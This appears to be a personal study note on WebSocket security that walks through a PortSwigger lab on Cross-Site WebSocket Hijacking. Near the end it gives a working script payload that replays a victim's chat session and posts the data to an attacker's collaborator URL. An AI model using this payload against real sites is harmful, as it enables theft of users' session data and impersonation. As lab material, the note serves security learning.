# WebSockets

Websockets is a communication protocol that provide for a full-duplex (two-way) interactive communication session between the user's browser and a server. With this, we can send messages to a server and receive responses without having to poll the server for a reply.

This is commonly used in the 'chat' feature in websites, such as raising enquiries to a chatbot or customer service employee. They also allow for users to performactions and stuff. Virtually any web security vulnerability that arises with regular HTTP can also arise in relation to WebSockets communications.

## How it Works

This is how the connection is typically established:

<figure><img src="../.gitbook/assets/image (4000).png" alt=""><figcaption></figcaption></figure>

A WebSocket handhsake request can be issued like this:

```http
GET /chat HTTP/1.1
Host: example.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
# Taken from HackTricks
```

Then the website would send a reply like this:

```http
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
# Taken from HackTricks
```

When the protocols are switched, a channel is opened for bi-directional communications and would remain open until either side closes the channel and the connection terminates.&#x20;

The exploitation happens when we intercept and change the traffic that is being sent through the WebSocket, and this can be done using Burpsuite. For example, we can use this to exploit XSS, SQL Injection, or even Command Injection in some rare cases.

The most common attack however is **Cross-Site Websocket hijacking**, which involves exploitation of the cookie that is used to identify a user. Sometimes, these cookies could be tagged to each unique user, and stealing it allows for impersonation of another user and reading of sensitive information.

## Example

This is the lab we will be using for this example:

{% embed url="https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab" %}

In this lab, there is a chatbot that relates each user to his websocket session via a sent cookie. The chatbot then sends back the entire history of each session once the word 'READY' is sent to it via websockets.

We can manipulate this by sending a basic XSS script that would retrieve the information and send it to our own attack server, in this case BurpSuite Collaborator is used.

```markup
<script>
    var ws = new WebSocket('wss://your-websocket-url');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

Then, our Burpsuite host would receive a callback that would contain all the data from another user's session.&#x20;
